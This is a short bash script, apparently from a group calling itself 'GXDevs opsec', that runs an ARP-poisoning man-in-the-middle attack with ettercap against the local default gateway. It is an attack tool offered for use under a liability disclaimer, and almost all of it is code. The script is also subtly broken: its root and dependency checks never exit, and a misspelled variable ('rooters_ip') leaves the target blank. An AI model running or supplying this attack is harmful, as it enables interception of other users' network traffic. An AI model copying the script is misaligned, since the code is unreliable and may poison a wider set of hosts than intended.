#!/bin/bash

#© 2025 [GXDevs opsec]. All Rights Reserved.

#Disclaimer:

#By using this software, you acknowledge and agree that 
#in no event shall the author or any contributors be held 
#liable for any damages (including, without limitation, 
#damages for loss of data or profit) arising out of the 
#use of this software, even if the author or a contributor 
#has been advised of the possibility of such damages. 
#This software is provided "as is", and you are using it at your own risk.

#MiTM attack using  ettercap

[ $(whoami) != "root" ] &&  echo "[!] run this script with sudo" exit 99 
#checks if the user is root or has sudo permissions^
[ -x $(command -v ettercap) ] || echo "[!] ettercap not installed" exit 98
#checks if ettercap is installed^
[ -x $(command -v ip) ] || echo "[!] ip is not installed" exit 96
#checks if ip is installed^
your_interface=$(ip -4 route show default | awk '{print $5}')
routers_ip=$(ip route show | grep -i 'default via'| awk '{print $3 }')
sudo ettercap -T -S -i "$your_interface" -M arp:remote /"$rooters_ip"// 
